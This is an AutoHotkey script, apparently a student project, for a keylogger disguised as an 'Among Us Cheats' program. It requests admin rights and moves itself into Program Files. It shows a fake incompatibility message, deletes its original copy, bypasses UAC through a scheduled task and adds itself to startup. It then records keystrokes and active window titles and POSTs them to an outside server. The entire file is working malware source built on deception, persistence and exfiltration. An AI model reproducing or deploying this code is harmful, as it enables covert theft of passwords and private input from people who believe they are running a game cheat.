#Persistent 
SetWorkingDir %A_ScriptDir%
#NoTrayIcon     ;hides icon from windows system tray
#Include Json.ahk
#Include Task.ahk
#Include TaskShortcut.ahk
CmdLine       := ( A_IsCompiled ? A_ScriptFullpath  : """"  A_AhkPath """ """ A_ScriptFullpath """" )

;requests admin privileges even if not run as admin!
If (not A_IsAdmin){
  Run *RunAs %CmdLine%, %A_ScriptDir%, UseErrorLevel
  ExitApp
}

moved := A_ScriptDir == A_ProgramFiles
If (not moved){
    FileMove, %A_ScriptFullPath%, %A_ProgramFiles%\%A_ScriptName% ;moves to program files
    ;prompts an innocent message box... WHICH IS A LIE!
    MsgBox, 0, Among Us Cheats, Sorry... your computer is not compatible with these cheats, please try another website. Exiting program and uninstalling...
    Sleep 2000 ; gives time for script to move
    Run *RunAs %A_ProgramFiles%\%A_ScriptName%, %A_ProgramFiles%, UseErrorLevel ;re-launches script from its new location
    Run CMD.exe /c timeout 1 > nul & Del "%A_ScriptFullPath%",, HIDE ; self-deletes from original directory after 1 second
    ExitApp
}

;After relaunching the script, we can now move on:
TaskName := RunAsTask() ;Bypass UAC on subsequent runs (needed for startup)
RunAsTask_CreateShortcut( TaskName, A_Startup, "sus" ) ;adds shortcut to startup folder, so it starts up every time computer launches


Loop {                                             
  Input, k , V T10, {enter}{esc}{tab} ;timeout after 10 sec, or when pressing enter, esc, tab
  WinGetActiveTitle , curr_window
  fullk = %curr_window% : %k%   ;    ; String with current window + keys
  data:=curr_window!=prev_window ? fullk :k   ;if new window detected, use fullk
  prev_window := curr_window 
  objParam :={"text": data, "response_type": "json"} 
  body := BuildJson(objParam)

   WinHTTP := ComObjCreate("WinHTTP.WinHttpRequest.5.1")
   WinHTTP.Open("POST", "http://dh2010pc20.utm.utoronto.ca:8084/")
   WinHTTP.SetRequestHeader("Content-Type", "application/json")
   WinHTTP.Send(body)
   Result := WinHTTP.ResponseText
   Status := WinHTTP.Status
}

;Code resources used:
;https://www.autohotkey.com/board/topic/73858-looking-for-efficient-key-logger-script/
;https://www.autohotkey.com/boards/viewtopic.php?f=6&t=4334
;https://www.autohotkey.com/board/topic/95262-obj-json-obj/
